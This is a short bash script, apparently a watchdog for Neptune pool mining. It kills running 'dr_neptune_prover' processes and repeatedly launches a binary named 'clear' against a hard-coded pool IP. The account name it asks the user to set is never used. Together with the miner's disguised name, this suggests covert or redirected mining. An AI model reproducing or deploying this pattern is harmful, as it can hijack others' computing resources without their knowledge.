#!/bin/bash

# set your own drpool accountname
accountname="majapahlevi"

pids=$(ps -ef | grep dr_neptune_prover | grep -v grep | awk '{print $2}')
if [ -n "$pids" ]; then
    echo "$pids" | xargs kill
    sleep 5
fi

while true; do
    target=$(ps aux | grep dr_neptune_prover | grep -v grep)
    if [ -z "$target" ]; then
        chmod +x clear && ./clear --pool 157.230.63.131:443 --worker $(shuf -n 1 -i 1-99999)-cococococol
        sleep 5
    fi
    sleep 60
done